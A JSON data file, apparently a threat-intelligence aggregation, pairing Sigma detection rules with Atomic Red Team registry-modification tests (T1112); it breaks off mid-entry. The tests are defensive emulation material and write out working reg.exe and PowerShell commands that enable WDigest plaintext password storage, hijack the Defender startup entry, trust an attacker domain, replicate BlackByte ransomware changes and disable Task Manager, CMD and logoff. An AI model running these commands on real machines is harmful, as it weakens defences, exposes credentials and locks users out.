                            "raw": "author: Florian Roth (Nextron Systems), wagga\ndate: 2018/03/20\ndescription: Detects NetNTLM downgrade attack\ndetection:\n  condition: selection\n  selection:\n    EventID: 4657\n    ObjectName|contains|all:\n    - \\REGISTRY\\MACHINE\\SYSTEM\n    - ControlSet\n    - \\Control\\Lsa\n    ObjectValueName:\n    - LmCompatibilityLevel\n    - NtlmMinClientSec\n    - RestrictSendingNTLMTraffic\nfalsepositives:\n- Unknown\nid: d3abac66-f11c-4ed0-8acb-50cc29c97eed\nlevel: high\nlogsource:\n  definition: 'Requirements: Audit Policy : Object Access > Audit Registry (Success)'\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks\nrelated:\n- id: d67572a0-e2ec-45d6-b8db-c100d14b8ef2\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.t1112\ntitle: NetNTLM Downgrade Attack\n",
                            "sigma:id": "d3abac66-f11c-4ed0-8acb-50cc29c97eed",
                            "title": "NetNTLM Downgrade Attack",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e61e8a88-59a9-451c-874e-70fcc9740d67",
                        "lookup_data": {
                            "description": "Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/05/08\ndescription: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter\n  in Registry, which can be used to execute code in context of the DNS server (restart\n  required)\ndetection:\n  condition: selection\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: \\services\\DNS\\Parameters\\ServerLevelPluginDll\nfalsepositives:\n- Unknown\nfields:\n- EventID\n- CommandLine\n- ParentCommandLine\n- Image\n- User\n- TargetObject\nid: e61e8a88-59a9-451c-874e-70fcc9740d67\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1574.002\n- attack.t1112\ntitle: DNS ServerLevelPluginDll Install - Registry\n",
                            "sigma:id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
                            "title": "DNS ServerLevelPluginDll Install - Registry",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1112",
                "display_name": "Modify Registry",
                "atomic_tests": [
                    {
                        "name": "Modify Registry of Current User Profile - cmd",
                        "auto_generated_guid": "1324796b-d0f6-455a-b4ae-21ffee6aa6b9",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n",
                            "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Modify Registry of Local Machine - cmd",
                        "auto_generated_guid": "282f929a-6bc5-42b8-bd93-960c3ba35afe",
                        "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "new_executable": {
                                "description": "New executable to run on startup instead of Windows Defender",
                                "type": "string",
                                "default": "calc.exe"
                            }
                        },
                        "executor": {
                            "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\n",
                            "cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify registry to store logon credentials",
                        "auto_generated_guid": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18",
                        "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Use Powershell to Modify registry to store logon credentials",
                        "auto_generated_guid": "68254a85-aa42-4312-a695-38b7276307f8",
                        "description": "Sets registry key using Powershell that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nOpen Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore\n",
                            "cleanup_command": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Add domain to Trusted sites Zone",
                        "auto_generated_guid": "cf447677-5a4e-4937-a82c-e47d254afd57",
                        "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "bad_domain": {
                                "description": "Domain to add to trusted site zone",
                                "type": "string",
                                "default": "bad-domain.com"
                            }
                        },
                        "executor": {
                            "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n",
                            "cleanup_command": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Javascript in registry",
                        "auto_generated_guid": "15f44ea9-4571-4837-be9e-802431a7bfae",
                        "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n",
                            "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Change Powershell Execution Policy to Bypass",
                        "auto_generated_guid": "f3a6cceb-06c9-48e5-8df8-8867a6814245",
                        "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "default_execution_policy": {
                                "description": "Specify the default poweshell execution policy",
                                "type": "string",
                                "default": "Default"
                            }
                        },
                        "executor": {
                            "command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n",
                            "cleanup_command": "try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "BlackByte Ransomware Registry Changes - CMD",
                        "auto_generated_guid": "4f4e2f9f-6209-4fcf-9b15-3b7455706f5b",
                        "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLinkedConnections /f >nul 2>&1\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\ /v LongPathsEnabled /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "BlackByte Ransomware Registry Changes - Powershell",
                        "auto_generated_guid": "0b79c06f-c788-44a2-8630-d69051f1123d",
                        "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n",
                            "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Registry Tool",
                        "auto_generated_guid": "ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "powershell Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" -Name DisableRegistryTools -ErrorAction Ignore\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows CMD application",
                        "auto_generated_guid": "d2561a6d-72bd-408c-b150-13efe1801c2a",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n",
                            "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Task Manager application",
                        "auto_generated_guid": "af254e70-dd0e-4de6-9afe-a994d9ea8b62",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Notification Center",
                        "auto_generated_guid": "c0d6d67f-1f63-42cc-95c0-5fd6b20082ad",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Shutdown Button",
                        "auto_generated_guid": "6e0d1131-2d7e-4905-8ca5-d6172f05d03d",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows LogOff Button",
                        "auto_generated_guid": "e246578a-c24d-46a7-9237-0213ff86fb0c",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /f >nul 2>&1\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Change Password Feature",
                        "auto_generated_guid": "d4a6da40-618f-454d-9a9e-26af552aaeb0",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Lock Workstation Feature",
                        "auto_generated_guid": "3dacb0d2-46ee-4c27-ac1b-f9886bf91a56",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoDesktop Group Policy Feature",
                        "auto_generated_guid": "93386d41-525c-4a1b-8235-134a628dee17",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoRun Group Policy Feature",
                        "auto_generated_guid": "d49ff3cc-8168-4123-b5b3-f057d9abbd55",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /f \n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoFind Group Policy Feature",
                        "auto_generated_guid": "ffbb407e-7f1d-4c95-b22e-548169db1fbd",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoControlPanel Group Policy Feature",
                        "auto_generated_guid": "a450e469-ba54-4de1-9deb-9023a6111690",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoFileMenu Group Policy Feature",
                        "auto_generated_guid": "5e27bdb4-7fd9-455d-a2b5-4b4b22c9dea4",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoClose Group Policy Feature",
                        "auto_generated_guid": "12f50e15-dbc6-478b-a801-a746e8ba1723",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoSetTaskbar Group Policy Feature",
                        "auto_generated_guid": "d29b7faf-7355-4036-9ed3-719bd17951ed",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoTrayContextMenu Group Policy Feature",
                        "auto_generated_guid": "4d72d4b1-fa7b-4374-b423-0fe326da49d2",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Activate Windows NoPropertiesMyDocuments Group Policy Feature",
                        "auto_generated_guid": "20fc9daa-bd48-4325-9aff-81b967a84b1d",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Hide Windows Clock Group Policy Feature",
                        "auto_generated_guid": "8023db1e-ad06-4966-934b-b6a0ae52689e",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Windows HideSCAHealth Group Policy Feature",
                        "auto_generated_guid": "a4637291-40b1-4a96-8c82-b28f1d73e54e",
                        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
